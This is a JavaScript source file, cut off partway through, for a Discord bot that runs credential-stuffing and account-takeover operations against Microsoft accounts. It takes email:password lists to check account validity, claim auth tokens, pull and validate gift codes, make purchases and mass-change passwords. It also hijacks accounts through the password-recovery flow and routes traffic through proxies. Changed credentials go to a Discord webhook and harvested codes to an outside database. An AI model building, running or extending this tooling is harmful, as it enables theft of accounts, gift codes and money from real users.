// ============================================================
//  MS Code Checker & WLID Claimer & Puller — Discord Bot
//  Supports both slash commands and dot-prefix commands
// ============================================================

const { Client, GatewayIntentBits, Partials, ActionRowBuilder, ButtonBuilder, ButtonStyle, ComponentType } = require("discord.js");
const config = require("./config");
const { AuthManager, parseDuration, formatDuration, formatExpiry } = require("./utils/auth-manager");
const { ConcurrencyLimiter } = require("./utils/concurrency");
const { OTPManager } = require("./utils/otp-manager");
const { StatsManager } = require("./utils/stats-manager");
const { sendToWebhook } = require("./utils/webhook");
const { checkCodes } = require("./utils/microsoft-checker");
const { claimWlids } = require("./utils/microsoft-claimer");
const { pullCodes, pullPromoLinks } = require("./utils/microsoft-puller");
const { savePromosUnchecked } = require("./utils/supabase-store");
const { searchProducts, getProductDetails, purchaseItems } = require("./utils/microsoft-purchaser");
const { changePasswords, checkAccounts } = require("./utils/microsoft-changer");
const { initiateRecovery, submitCaptchaAndContinue, submitNewPassword, downloadCaptchaImage } = require("./utils/microsoft-recover");
const { loadProxies, isProxyEnabled, getProxyCount, getProxyStats, reloadProxies } = require("./utils/proxy-manager");
const blacklist = require("./utils/blacklist");
const { setWlids, getWlids, getWlidCount } = require("./utils/wlid-store");
const {
  progressEmbed,
  checkResultsEmbed,
  claimResultsEmbed,
  pullFetchProgressEmbed,
  pullLiveProgressEmbed,
  pullResultsEmbed,
  promoPullProgressEmbed,
  promoPullResultsEmbed,
  purchaseResultsEmbed,
  purchaseProgressEmbed,
  productSearchEmbed,
  changerResultsEmbed,
  accountCheckerResultsEmbed,
  rewardsResultsEmbed,
  errorEmbed,
  successEmbed,
  infoEmbed,
  ownerOnlyEmbed,
  authListEmbed,
  helpOverviewEmbed,
  helpCategoryEmbed,
  helpSelectMenu,
  welcomeEmbed,
  adminPanelEmbed,
  detailedStatsEmbed,
  textAttachment,
  recoverProgressEmbed,
  recoverResultEmbed,
} = require("./utils/embeds");
const { checkRewardsBalances } = require("./utils/microsoft-rewards");

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
  partials: [Partials.Message, Partials.Channel],
});

const auth = new AuthManager();
const limiter = new ConcurrencyLimiter(config.MAX_CONCURRENT_USERS);
const otpManager = new OTPManager();
const statsManager = new StatsManager();

// Webhook URL stored in memory (owner sets via /setwebhook)
let webhookUrl = "";

// Active abort controllers per user
const activeAborts = new Map();

// Active recovery sessions per user (for multi-step CAPTCHA flow)
const activeRecoverySessions = new Map();

// Track users who have seen the welcome message
const welcomedUsers = new Set();

// ── Helpers ──────────────────────────────────────────────────

function isOwner(userId) {
  return userId === config.OWNER_ID;
}

function isAllowedChannel(channelId) {
  if (!config.ALLOWED_CHANNEL_ID) return true;
  return channelId === config.ALLOWED_CHANNEL_ID;
}

function canUse(userId) {
  if (blacklist.isBlacklisted(userId)) return false;
  const allowed = isOwner(userId) || auth.isAuthorized(userId);
  if (allowed) otpManager.ensureAuthenticated(userId); // auto-session
  return allowed;
}

/**
 * Send welcome embed on first command use (per session).
 * Returns true if welcome was sent (caller should continue normally).
 */
async function sendWelcomeIfNeeded(respond, userId, username) {
  if (welcomedUsers.has(userId)) return;
  welcomedUsers.add(userId);
  try {
    await respond({ embeds: [welcomeEmbed(username)] });
  } catch {}
}

function splitInput(raw) {
  if (!raw) return [];
  return raw
    .split(/[\n,]+/)
    .map((s) => s.trim())
    .filter(Boolean);
}

async function fetchAttachmentLines(attachment) {
  if (!attachment) return [];
  const res = await fetch(attachment.url);
  const text = await res.text();
  return text.split("\n").map((l) => l.trim()).filter(Boolean);
}

function stopButton(userId) {
  return new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId(`stop_${userId}`)
      .setLabel("Stop")
      .setStyle(ButtonStyle.Secondary)
  );
}

async function updateProgress(msg, embed, userId) {
  try {
    await msg.edit({ embeds: [embed], components: [stopButton(userId)] });
  } catch { /* ignore rate limits */ }
}

// ── WLID Set handler ────────────────────────────────────────

async function handleWlidSet(respond, userId, wlidsRaw, wlidsFile) {
  if (!isOwner(userId)) return respond({ embeds: [errorEmbed("Only the bot owner can set WLIDs.")] });

  let wlids = splitInput(wlidsRaw);
  if (wlidsFile) {
    const lines = await fetchAttachmentLines(wlidsFile);
    wlids = wlids.concat(lines);
  }

  if (wlids.length === 0) return respond({ embeds: [errorEmbed("No WLID tokens provided. Paste them or attach a `.txt` file.")] });

  setWlids(wlids);
  return respond({ embeds: [successEmbed(`WLID tokens updated. **${wlids.length}** tokens stored.\n\nPrevious tokens have been replaced.`)] });
}

// ── Check handler ────────────────────────────────────────────

async function handleCheck(respond, userId, wlidsRaw, codesRaw, codesFile, threads = 10, dmUser = null) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });

  const acquire = limiter.acquire(userId, "check");
  if (!acquire.ok) {
    const reason = acquire.reason === "busy"
      ? "You already have a command running. Wait for it to finish."
      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
    return respond({ embeds: [errorEmbed(reason)] });
  }

  const ac = new AbortController();
  activeAborts.set(userId, ac);

  try {
    let wlids = splitInput(wlidsRaw);
    if (wlids.length === 0) wlids = getWlids();
    
    let codes = splitInput(codesRaw);
    if (codesFile) codes = codes.concat(await fetchAttachmentLines(codesFile));

    if (wlids.length === 0) return respond({ embeds: [errorEmbed("No WLID tokens provided and none stored.\nUse `/wlidset` or `.wlidset` to set WLIDs first, or provide them directly.")] });
    if (codes.length === 0) return respond({ embeds: [errorEmbed("No codes provided. Use the `codes` option or attach a `.txt` file.")] });

    const msg = await respond({
      embeds: [progressEmbed(0, codes.length, `Checking codes (${wlids.length} WLIDs)`)],
      components: [stopButton(userId)],
      fetchReply: true,
    });

    let lastUpdate = Date.now();
    const results = await checkCodes(wlids, codes, threads, (done, total) => {
      const now = Date.now();
      if (now - lastUpdate > 2000) {
        lastUpdate = now;
        updateProgress(msg, progressEmbed(done, total, "Checking codes"), userId);
      }
    }, ac.signal);

    const stopped = ac.signal.aborted;
    const files = [];
    const valid = results.filter((r) => r.status === "valid");
    const used = results.filter((r) => r.status === "used");
    const expired = results.filter((r) => r.status === "expired");
    const invalid = results.filter((r) => r.status === "invalid" || r.status === "error");

    if (valid.length > 0)
      files.push(textAttachment(valid.map((r) => (r.title ? `${r.code} | ${r.title}` : r.code)), "valid.txt"));
    if (used.length > 0)
      files.push(textAttachment(used.map((r) => r.code), "used.txt"));
    if (expired.length > 0)
      files.push(textAttachment(expired.map((r) => (r.title ? `${r.code} | ${r.title}` : r.code)), "expired.txt"));
    if (invalid.length > 0)
      files.push(textAttachment(invalid.map((r) => r.code), "invalid.txt"));

    const embed = checkResultsEmbed(results);
    if (stopped) embed.setTitle("Check Results (Stopped)");

    if (dmUser) {
      try {
        await dmUser.send({ embeds: [embed], files });
        await msg.edit({ embeds: [infoEmbed("Check Complete", "Results sent to your DMs.")], components: [] });
      } catch {
        await msg.edit({ embeds: [embed], files, components: [] });
      }
    } else {
      await msg.edit({ embeds: [embed], files, components: [] });
    }
  } catch (err) {
    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
  } finally {
    activeAborts.delete(userId);
    limiter.release(userId);
  }
}

// ── Claim handler ────────────────────────────────────────────

async function handleClaim(respond, userId, accountsRaw, accountsFile, threads = 5, dmUser = null) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });

  const acquire = limiter.acquire(userId, "claim");
  if (!acquire.ok) {
    const reason = acquire.reason === "busy"
      ? "You already have a command running. Wait for it to finish."
      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
    return respond({ embeds: [errorEmbed(reason)] });
  }

  const ac = new AbortController();
  activeAborts.set(userId, ac);

  try {
    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
    if (accountsFile) {
      const lines = await fetchAttachmentLines(accountsFile);
      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
    }

    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });

    const msg = await respond({
      embeds: [progressEmbed(0, accounts.length, "Claiming WLIDs")],
      components: [stopButton(userId)],
      fetchReply: true,
    });

    let lastUpdate = Date.now();
    const results = await claimWlids(accounts, threads, (done, total) => {
      const now = Date.now();
      if (now - lastUpdate > 2000) {
        lastUpdate = now;
        updateProgress(msg, progressEmbed(done, total, "Claiming WLIDs"), userId);
      }
    }, ac.signal);

    const stopped = ac.signal.aborted;
    const files = [];
    const success = results.filter((r) => r.success && r.token);
    const failed = results.filter((r) => !r.success);

    if (success.length > 0)
      files.push(textAttachment(success.map((r) => r.token), "tokens.txt"));
    if (failed.length > 0)
      files.push(textAttachment(failed.map((r) => `${r.email}: ${r.error || "Unknown error"}`), "failed.txt"));

    const embed = claimResultsEmbed(results);
    if (stopped) embed.setTitle("Claim Results (Stopped)");

    if (dmUser) {
      try {
        await dmUser.send({ embeds: [embed], files });
        await msg.edit({ embeds: [infoEmbed("Claim Complete", "Results sent to your DMs.")], components: [] });
      } catch {
        await msg.edit({ embeds: [embed], files, components: [] });
      }
    } else {
      await msg.edit({ embeds: [embed], files, components: [] });
    }
  } catch (err) {
    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
  } finally {
    activeAborts.delete(userId);
    limiter.release(userId);
  }
}

// ── Pull handler ─────────────────────────────────────────────

async function handlePull(respond, userId, accountsRaw, accountsFile, dmUser = null, username = null) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });

  const acquire = limiter.acquire(userId, "pull");
  if (!acquire.ok) {
    const reason = acquire.reason === "busy"
      ? "You already have a command running. Wait for it to finish."
      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
    return respond({ embeds: [errorEmbed(reason)] });
  }

  const ac = new AbortController();
  activeAborts.set(userId, ac);
  const startTime = Date.now();

  try {
    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
    if (accountsFile) {
      const lines = await fetchAttachmentLines(accountsFile);
      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
    }

    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });

    const msg = await respond({
      embeds: [pullFetchProgressEmbed({ done: 0, total: accounts.length, totalCodes: 0, working: 0, failed: 0, withCodes: 0, noCodes: 0, startTime, username })],
      components: [stopButton(userId)],
      fetchReply: true,
    });

    let lastUpdate = Date.now();
    let totalCodesSoFar = 0;
    let lastAccount = "";
    let lastCodes = 0;
    let lastError = null;
    let fetchWorking = 0;
    let fetchFailed = 0;
    let fetchWithCodes = 0;
    let fetchNoCodes = 0;
    let fetchResultsRef = [];
    let validateCounts = {};
    const startTime = Date.now();

    const { fetchResults, validateResults } = await pullCodes(accounts, (phase, detail) => {
      const now = Date.now();

      if (phase === "fetch") {
        totalCodesSoFar += detail.codes;
        lastAccount = detail.email;
        lastCodes = detail.codes;
        lastError = detail.error;

        if (detail.error) {
          fetchFailed++;
        } else {
          fetchWorking++;
          if (detail.codes > 0) fetchWithCodes++;
          else fetchNoCodes++;
        }

        if (now - lastUpdate > 2000) {
          lastUpdate = now;
          updateProgress(msg, pullFetchProgressEmbed({
            done: detail.done,
            total: detail.total,
            totalCodes: totalCodesSoFar,
            working: fetchWorking,
            failed: fetchFailed,
            withCodes: fetchWithCodes,
            noCodes: fetchNoCodes,
            lastAccount,
            lastCodes,
            lastError,
            startTime,
            username,
          }), userId);
        }
      } else if (phase === "validate_start") {
        // Capture fetch results for live display
        if (detail.fetchResults) fetchResultsRef = detail.fetchResults;
        validateCounts = { done: 0, total: detail.total, valid: 0, used: 0, balance: 0, expired: 0, regionLocked: 0, invalid: 0 };
        updateProgress(msg, pullLiveProgressEmbed(fetchResultsRef, validateCounts, { username, startTime }), userId);
      } else if (phase === "validate") {
        validateCounts.done = detail.done;
        // Update counts from detail if available
        if (detail.status) {
          if (detail.status === "valid") validateCounts.valid++;
          else if (detail.status === "used" || detail.status === "REDEEMED") validateCounts.used++;
          else if (detail.status === "BALANCE_CODE") validateCounts.balance++;
          else if (detail.status === "expired" || detail.status === "EXPIRED") validateCounts.expired++;
          else if (detail.status === "REGION_LOCKED") validateCounts.regionLocked++;
          else if (detail.status === "invalid" || detail.status === "error" || detail.status === "INVALID") validateCounts.invalid++;
        }
        if (now - lastUpdate > 2000) {
          lastUpdate = now;
          updateProgress(msg, pullLiveProgressEmbed(fetchResultsRef, validateCounts, { username, startTime }), userId);
        }
      }
    }, ac.signal);

    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    const stopped = ac.signal.aborted;
    const files = [];
    const valid = validateResults.filter((r) => r.status === "valid");
    const used = validateResults.filter((r) => r.status === "used");
    const expired = validateResults.filter((r) => r.status === "expired");
    const invalid = validateResults.filter((r) => r.status === "invalid" || r.status === "error");

    // Collect all raw promo links fetched from accounts
    const allPromoLinks = fetchResults.flatMap((r) =>
      r.codes.map((code) => code)
    );

    // Save promo links to promos_unchecked database
    if (allPromoLinks.length > 0) {
      const linksToSave = fetchResults.flatMap((r) =>
        r.codes.map((code) => ({
          code,
          source_email: r.email,
          status: "unchecked",
        }))
      );
      savePromosUnchecked(linksToSave, { pulledBy: username, discordUserId: userId }).catch(() => {});
    }

    // Add promo links as txt file
    if (allPromoLinks.length > 0) {
      files.push(textAttachment(allPromoLinks, "promo_links.txt"));
    }

    if (valid.length > 0)
      files.push(textAttachment(valid.map((r) => (r.title ? `${r.code} | ${r.title}` : r.code)), "valid.txt"));
    if (used.length > 0)
      files.push(textAttachment(used.map((r) => r.code), "used.txt"));
    if (expired.length > 0)
      files.push(textAttachment(expired.map((r) => (r.title ? `${r.code} | ${r.title}` : r.code)), "expired.txt"));
    if (invalid.length > 0)
      files.push(textAttachment(invalid.map((r) => r.code), "invalid.txt"));

    const embed = pullResultsEmbed(fetchResults, validateResults, {
      elapsed,
      dmSent: !!dmUser,
      username: username || undefined,
    });
    if (stopped) embed.setDescription(embed.data.description + "\n\n*Stopped -- partial results*");

    if (dmUser) {
      try {
        await dmUser.send({ embeds: [embed], files });
        await msg.edit({ embeds: [pullResultsEmbed(fetchResults, validateResults, { elapsed, dmSent: true, username: username || undefined })], components: [] });
      } catch {
        await msg.edit({ embeds: [embed], files, components: [] });
      }
    } else {
      await msg.edit({ embeds: [embed], files, components: [] });
    }
  } catch (err) {
    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
  } finally {
    activeAborts.delete(userId);
    limiter.release(userId);
  }
}

// ── Auth handler ─────────────────────────────────────────────

async function handleAuth(respond, callerId, targetId, durationStr) {
  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Only the bot owner can authorize users.")] });

  const ms = parseDuration(durationStr);
  if (ms === null) return respond({ embeds: [errorEmbed(`Invalid duration: \`${durationStr}\`\nExamples: 1h, 7d, 30d, 1mo, forever`)] });

  auth.authorize(targetId, ms, callerId);
  const durLabel = ms === Infinity ? "Permanent" : formatDuration(ms);
  return respond({ embeds: [successEmbed(`<@${targetId}> has been authorized for **${durLabel}**.`)] });
}

async function handleDeauth(respond, callerId, targetId) {
  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Only the bot owner can deauthorize users.")] });
  auth.deauthorize(targetId);
  return respond({ embeds: [successEmbed(`<@${targetId}> has been deauthorized.`)] });
}

async function handleAuthList(respond) {
  const entries = auth.getAllAuthorized();
  return respond({ embeds: [authListEmbed(entries)] });
}

async function handleStats(respond) {
  const activeCount = limiter.getActiveCount();
  const authCount = auth.getAllAuthorized().length;
  const wlidCount = getWlidCount();
  const blCount = blacklist.getCount();
  const proxyStatus = isProxyEnabled() ? `Enabled (${getProxyCount()} loaded)` : "Disabled";
  const ps = getProxyStats();
  const proxyLine = isProxyEnabled()
    ? `Proxies: \`${proxyStatus}\`\nProxy requests: \`${ps.total}\` (${ps.successRate}% success)`
    : `Proxies: \`${proxyStatus}\``;

  return respond({
    embeds: [
      infoEmbed(
        "Bot Status",
        [
          `Active sessions: \`${activeCount}/${config.MAX_CONCURRENT_USERS}\``,
          `Authorized users: \`${authCount}\``,
          `Blacklisted users: \`${blCount}\``,
          `Stored WLIDs: \`${wlidCount}\``,
          proxyLine,
          `Uptime: \`${formatUptime(process.uptime())}\``,
          `Ping: \`${client.ws.ping}ms\``,
        ].join("\n")
      ),
    ],
  });
}

// ── Blacklist handlers ──────────────────────────────────────

async function handleBlacklist(respond, callerId, targetId, reason) {
  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Only the bot owner can blacklist users.")] });
  if (targetId === callerId) return respond({ embeds: [errorEmbed("You cannot blacklist yourself.")] });
  blacklist.add(targetId, reason || "No reason");
  return respond({ embeds: [successEmbed(`<@${targetId}> has been blacklisted.\nReason: ${reason || "No reason"}`)] });
}

async function handleUnblacklist(respond, callerId, targetId) {
  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Only the bot owner can unblacklist users.")] });
  const removed = blacklist.remove(targetId);
  if (!removed) return respond({ embeds: [errorEmbed("That user is not blacklisted.")] });
  return respond({ embeds: [successEmbed(`<@${targetId}> has been removed from the blacklist.`)] });
}

async function handleBlacklistShow(respond) {
  const entries = blacklist.getAll();
  if (entries.length === 0) {
    return respond({ embeds: [infoEmbed("Blacklist", "No blacklisted users.")] });
  }
  const lines = entries.map((e, i) => {
    const date = `<t:${Math.floor(e.addedAt / 1000)}:R>`;
    return `\`${i + 1}.\` <@${e.userId}> — ${e.reason} (${date})`;
  });
  return respond({ embeds: [infoEmbed("Blacklist", lines.join("\n"))] });
}

function formatUptime(seconds) {
  const d = Math.floor(seconds / 86400);
  const h = Math.floor((seconds % 86400) / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${d}d ${h}h ${m}m ${s}s`;
}

// ── Purchase handler ─────────────────────────────────────────

async function handlePurchase(respond, userId, accountsRaw, accountsFile, productUrl, dmUser = null) {
  if (!isOwner(userId)) return respond({ embeds: [ownerOnlyEmbed("Purchaser")] });

  const acquire = limiter.acquire(userId, "purchase");
  if (!acquire.ok) {
    const reason = acquire.reason === "busy"
      ? "You already have a command running. Wait for it to finish."
      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
    return respond({ embeds: [errorEmbed(reason)] });
  }

  const ac = new AbortController();
  activeAborts.set(userId, ac);

  try {
    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
    if (accountsFile) {
      const lines = await fetchAttachmentLines(accountsFile);
      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
    }

    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
    if (!productUrl) return respond({ embeds: [errorEmbed("No product URL or ID provided.")] });

    // Extract product ID from URL or use directly
    let productId = productUrl.trim();
    const urlMatch = productId.match(/\/store\/[^/]+\/([a-zA-Z0-9]{12})/i) || productId.match(/\/p\/([a-zA-Z0-9]{12})/i);
    if (urlMatch) productId = urlMatch[1];

    // If it looks like a search query instead of an ID, search first
    if (productId.length > 12 || productId.includes(" ")) {
      const searchResults = await searchProducts(productId);
      if (searchResults.length === 0) return respond({ embeds: [errorEmbed(`No products found for: ${productId}`)] });
      
      const embed = productSearchEmbed(searchResults.slice(0, 5));
      return respond({ embeds: [embed, infoEmbed("Tip", "Copy the product ID and run the command again with it.")] });
    }

    // Get product details
    const product = await getProductDetails(productId);
    if (!product) return respond({ embeds: [errorEmbed(`Product not found: ${productId}`)] });
    if (!product.skus || product.skus.length === 0) return respond({ embeds: [errorEmbed(`No purchasable SKUs found for: ${product.title}`)] });

    // Use the first available SKU
    const sku = product.skus[0];

    const msg = await respond({
      embeds: [purchaseProgressEmbed({
        product: product.title,
        price: `${sku.price} ${sku.currency}`,
        done: 0,
        total: accounts.length,
        status: "Starting",
      })],
      components: [stopButton(userId)],
      fetchReply: true,
    });

    let lastUpdate = Date.now();
    const results = await purchaseItems(
      accounts,
      productId,
      sku.skuId,
      sku.availabilityId,
      (phase, detail) => {
        const now = Date.now();
        if (now - lastUpdate > 2000) {
          lastUpdate = now;
          let status = "Processing";
          if (phase === "login") status = `Logging in: ${detail.email}`;
          else if (phase === "cart") status = `Getting cart: ${detail.email}`;
          else if (phase === "purchase") status = `Purchasing: ${detail.email}`;
          else if (phase === "result") status = detail.success ? `Purchased: ${detail.email}` : `Failed: ${detail.email}`;

          updateProgress(msg, purchaseProgressEmbed({
            product: product.title,
            price: `${sku.price} ${sku.currency}`,
            done: detail.done || 0,
            total: detail.total || accounts.length,
            status,
          }), userId);
        }
      },
      ac.signal
    );

    const stopped = ac.signal.aborted;
    const files = [];
    const successful = results.filter(r => r.success);
    const failed = results.filter(r => !r.success);

    if (successful.length > 0)
      files.push(textAttachment(successful.map(r => `${r.email} | ${r.orderId || "OK"}`), "purchased.txt"));
    if (failed.length > 0)
      files.push(textAttachment(failed.map(r => `${r.email} | ${r.error || "Failed"}`), "failed.txt"));

    const embed = purchaseResultsEmbed(results, product.title, `${sku.price} ${sku.currency}`);
    if (stopped) embed.setTitle("Purchase Results (Stopped)");

    if (dmUser) {
      try {
        await dmUser.send({ embeds: [embed], files });
        await msg.edit({ embeds: [infoEmbed("Purchase Complete", "Results sent to your DMs.")], components: [] });
      } catch {
        await msg.edit({ embeds: [embed], files, components: [] });
      }
    } else {
      await msg.edit({ embeds: [embed], files, components: [] });
    }
  } catch (err) {
    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
  } finally {
    activeAborts.delete(userId);
    limiter.release(userId);
  }
}

// ── Search handler ───────────────────────────────────────────

async function handleSearch(respond, query) {
  if (!query) return respond({ embeds: [errorEmbed("Provide a search query.")] });

  const results = await searchProducts(query);
  if (results.length === 0) return respond({ embeds: [errorEmbed(`No results for: ${query}`)] });

  return respond({ embeds: [productSearchEmbed(results.slice(0, 10))] });
}

// ── Changer handler ──────────────────────────────────────────

async function handleChanger(respond, userId, accountsRaw, accountsFile, newPassword, threads = 5, dmUser = null) {
  if (!isOwner(userId)) return respond({ embeds: [ownerOnlyEmbed("Changer")] });

  const acquire = limiter.acquire(userId, "changer");
  if (!acquire.ok) {
    const reason = acquire.reason === "busy"
      ? "You already have a command running. Wait for it to finish."
      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
    return respond({ embeds: [errorEmbed(reason)] });
  }

  const ac = new AbortController();
  activeAborts.set(userId, ac);

  try {
    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
    if (accountsFile) {
      const lines = await fetchAttachmentLines(accountsFile);
      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
    }

    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
    if (!newPassword) return respond({ embeds: [errorEmbed("No new password provided.")] });
    if (newPassword.length < 8) return respond({ embeds: [errorEmbed("New password must be at least 8 characters.")] });

    const msg = await respond({
      embeds: [progressEmbed(0, accounts.length, "Changing passwords")],
      components: [stopButton(userId)],
      fetchReply: true,
    });

    let lastUpdate = Date.now();
    const results = await changePasswords(accounts, newPassword, threads, (done, total) => {
      const now = Date.now();
      if (now - lastUpdate > 2000) {
        lastUpdate = now;
        updateProgress(msg, progressEmbed(done, total, "Changing passwords"), userId);
      }
    }, ac.signal);

    const stopped = ac.signal.aborted;
    const files = [];
    const success = results.filter(r => r.success);
    const failed = results.filter(r => !r.success);

    if (success.length > 0)
      files.push(textAttachment(success.map(r => `${r.email}:${r.newPassword}`), "changed.txt"));
    if (failed.length > 0)
      files.push(textAttachment(failed.map(r => `${r.email}: ${r.error || "Failed"}`), "failed.txt"));

    const embed = changerResultsEmbed(results);
    if (stopped) embed.setTitle("Changer Results (Stopped)");

    // Send successful changes to webhook + record stats
    for (const r of success) {
      statsManager.record(userId, "changer", true);
      sendToWebhook(webhookUrl, {
        email: r.email,
        oldPassword: r.oldPassword || "N/A",
        newPassword: r.newPassword,
        userId,
      });
    }
    for (const r of failed) {
      statsManager.record(userId, "changer", false);
    }

    if (dmUser) {
      try {
        await dmUser.send({ embeds: [embed], files });
        await msg.edit({ embeds: [infoEmbed("Changer Complete", "Results sent to your DMs.")], components: [] });
      } catch {
        await msg.edit({ embeds: [embed], files, components: [] });
      }
    } else {
      await msg.edit({ embeds: [embed], files, components: [] });
    }
  } catch (err) {
    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
  } finally {
    activeAborts.delete(userId);
    limiter.release(userId);
  }
}

// ── Account checker handler ──────────────────────────────────

async function handleAccountChecker(respond, userId, accountsRaw, accountsFile, threads = 5, dmUser = null) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });

  const acquire = limiter.acquire(userId, "checker");
  if (!acquire.ok) {
    const reason = acquire.reason === "busy"
      ? "You already have a command running. Wait for it to finish."
      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
    return respond({ embeds: [errorEmbed(reason)] });
  }

  const ac = new AbortController();
  activeAborts.set(userId, ac);

  try {
    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
    if (accountsFile) {
      const lines = await fetchAttachmentLines(accountsFile);
      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
    }

    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).") ] });

    const msg = await respond({
      embeds: [progressEmbed(0, accounts.length, "Checking accounts")],
      components: [stopButton(userId)],
      fetchReply: true,
    });

    let lastUpdate = Date.now();
    const results = await checkAccounts(accounts, threads, (done, total) => {
      const now = Date.now();
      if (now - lastUpdate > 2000) {
        lastUpdate = now;
        updateProgress(msg, progressEmbed(done, total, "Checking accounts"), userId);
      }
    }, ac.signal);

    const stopped = ac.signal.aborted;
    const files = [];
    const valid = results.filter((r) => r.status === "valid");
    const locked = results.filter((r) => r.status === "locked");
    const invalid = results.filter((r) => r.status === "invalid");
    const failed = results.filter((r) => r.status !== "valid");

    if (valid.length > 0) files.push(textAttachment(valid.map((r) => `${r.email}`), "valid.txt"));
    if (locked.length > 0) files.push(textAttachment(locked.map((r) => `${r.email}: Account locked`), "locked.txt"));
    if (invalid.length > 0) files.push(textAttachment(invalid.map((r) => `${r.email}: Invalid credentials`), "invalid.txt"));
    if (failed.length > 0) files.push(textAttachment(failed.map((r) => `${r.email}: ${r.error || r.status || "Failed"}`), "failed.txt"));

    const embed = accountCheckerResultsEmbed(results);
    if (stopped) embed.setTitle("Account Checker Results (Stopped)");

    if (dmUser) {
      try {
        await dmUser.send({ embeds: [embed], files });
        await msg.edit({ embeds: [infoEmbed("Checker Complete", "Results sent to your DMs.")], components: [] });
      } catch {
        await msg.edit({ embeds: [embed], files, components: [] });
      }
    } else {
      await msg.edit({ embeds: [embed], files, components: [] });
    }
  } catch (err) {
    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
  } finally {
    activeAborts.delete(userId);
    limiter.release(userId);
  }
}

// ── Admin handlers ──────────────────────────────────────────

async function handleAdminPanel(respond, callerId) {
  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Admin only.")] });

  const stats = statsManager.getSummary();
  const authCount = auth.getAllAuthorized().length;
  const otpSessions = otpManager.getActiveSessionCount();
  const activeProcesses = limiter.getActiveCount();
  const hasWebhook = !!webhookUrl;

  return respond({ embeds: [adminPanelEmbed(stats, authCount, otpSessions, activeProcesses, hasWebhook)] });
}

async function handleSetWebhook(respond, callerId, url) {
  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Admin only.")] });

  if (!url.startsWith("https://discord.com/api/webhooks/")) {
    return respond({ embeds: [errorEmbed("Invalid webhook URL format.")] });
  }

  webhookUrl = url;
  return respond({ embeds: [successEmbed("Webhook URL configured successfully!")] });
}

async function handleBotStats(respond, callerId) {
  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Admin only.")] });

  const stats = statsManager.getSummary();
  const topUsers = statsManager.getTopUsers(5);
  return respond({ embeds: [detailedStatsEmbed(stats, topUsers)] });
}

// ── Account Recovery Handler ─────────────────────────────────

async function recoverSingleEmail(email, newPassword, userId) {
  const result = await initiateRecovery(email);
  if (!result.success) {
    return { email, success: false, error: result.error };
  }
  if (result.phase === "password_reset") {
    const pwResult = await submitNewPassword(result, newPassword);
    statsManager.record(userId, "recover", !!pwResult.success);
    return { email, success: pwResult.success, message: pwResult.success ? pwResult.message : pwResult.error };
  }
  if (result.phase === "captcha_required") {
    return { email, success: false, error: `CAPTCHA required (${result.captchaInfo.type || "unknown"}) — skipped in bulk mode`, skipped: true, session: result };
  }
  if (result.phase === "verify_identity") {
    return { email, success: false, error: "Identity verification required — skipped", skipped: true };
  }
  return { email, success: false, error: `Unexpected phase: ${result.phase}` };
}

async function handleRecover(respond, userId, emailsRaw, emailsFile, newPassword, threads, dmUser, interaction, message) {
  if (!isOwner(userId) && !auth.isAuthorized(userId)) {
    return respond({ embeds: [errorEmbed("Not authorized. Ask the owner to run `/auth`.")] });
  }
  if (blacklist.isBlacklisted(userId)) {
    return respond({ embeds: [errorEmbed("You are blacklisted.")] });
  }
  if (!newPassword) {
    return respond({ embeds: [errorEmbed("Provide the new password to set.")] });
  }

  // Collect emails from input + file
  let emails = splitInput(emailsRaw)
    .map((e) => e.trim().toLowerCase())
    .map((e) => (e.includes(":") ? e.split(":")[0].trim() : e))
    .filter((e) => e.includes("@") && !e.includes(" "));
  if (emailsFile) {
